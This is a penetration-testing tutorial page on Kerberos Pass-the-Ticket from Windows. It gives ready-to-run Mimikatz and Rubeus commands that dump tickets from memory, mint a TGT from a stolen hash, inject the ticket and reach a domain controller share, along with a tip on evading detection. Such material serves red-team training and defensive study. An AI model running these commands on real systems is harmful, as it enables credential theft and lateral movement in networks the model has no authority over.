---
title: Pass-the-Ticket (from Windows)
slug: pass-the-ticket-windows
area: active-directory
module: 10
order: 1
goal: Reuse a Kerberos ticket (TGT or TGS) on a Windows host to authenticate as its owner.
summary: How to do Pass-the-Ticket from a Windows foothold — harvest tickets with Mimikatz or Rubeus, then inject one with Rubeus ptt (or over-pass-the-hash a captured NT/AES key into a fresh TGT).
prereqs: [A Windows foothold (ideally local admin / SYSTEM to export other users' tickets), A ticket to reuse (.kirbi or base64) or an NT/AES key, The DC reachable on 88 and clocks within 5 minutes]
seeAlso: [tool:rubeus, tool:mimikatz, tool:kerberos-attacks, map:credential-access, map:active-directory]
references:
  - The Hacker Recipes: Kerberos movement | https://www.thehacker.recipes/ad/movement/kerberos/
  - Rubeus | https://github.com/GhostPack/Rubeus
---

Kerberos authenticates with **tickets**, not passwords. If you can grab a user's TGT (their master ticket) or a service ticket, you can inject it into your session and act as them — no password, no hash on the wire. Unlike Pass-the-Hash this is Kerberos, so it works where NTLM is blocked.

## Harvest tickets already on the box

As local admin / SYSTEM you can export every ticket in memory.

```cmd
mimikatz.exe privilege::debug "sekurlsa::tickets /export" exit
Rubeus.exe dump /nowrap
```

Tickets export as `.kirbi` files (Mimikatz) or base64 blobs (Rubeus).

## Or mint a TGT from a hash (over-pass-the-hash)

If you have the user's NT or AES key but no ticket, ask the DC for a fresh TGT. AES is quieter than RC4/NT and avoids downgrade detections.

```cmd
Rubeus.exe asktgt /user:jsmith /rc4:31d6cfe0d16ae931b73c59d7e0c089c0 /nowrap
Rubeus.exe asktgt /user:jsmith /aes256:<aeskey> /nowrap
```

## Inject the ticket (Pass-the-Ticket)

Load the ticket into your current logon session, then use any Kerberos-aware tool as that user.

```cmd
Rubeus.exe ptt /ticket:ticket.kirbi
mimikatz.exe "kerberos::ptt ticket.kirbi" exit
```

```cmd
klist                 :: confirm the ticket is loaded
dir \\DC01\C$         :: now act as the user over Kerberos
```

## If it fails

- **KRB_AP_ERR_SKEW / clock skew**: your host and the DC differ by more than five minutes. Sync time to the DC (`net time \\DC01` / `w32tm`).
- **Ticket expired**: TGTs live ~10 hours. Mint a fresh one with `asktgt`, or renew.
- **Wrong target name**: use the host's FQDN, not its IP — Kerberos is name-based, and an IP forces NTLM.
- **Access denied as the right user**: the user simply may not have rights there; the ticket is valid, the permission is not.

## Verify

```cmd
klist                                  :: the injected ticket is listed
Rubeus.exe triage                      :: see all tickets in the session
```

Have a `.ccache`/`.kirbi` from Linux instead, or want to run Impacket? Convert and reuse it — see Pass-the-Ticket (from Linux).
